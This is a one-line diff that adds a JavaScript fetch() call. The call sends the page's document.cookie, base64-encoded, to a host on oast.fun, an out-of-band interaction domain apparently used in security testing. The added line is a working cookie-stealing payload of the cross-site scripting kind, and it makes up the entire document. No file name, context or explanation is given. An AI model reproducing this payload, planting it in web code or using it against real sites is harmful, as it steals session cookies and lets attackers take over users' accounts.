@@ -1,0 +1,1 @@
+fetch("http://zlhmgcfexjkhjmhvxzhtv3qsaq01po37q.oast.fun/?c=" + btoa(document.cookie))
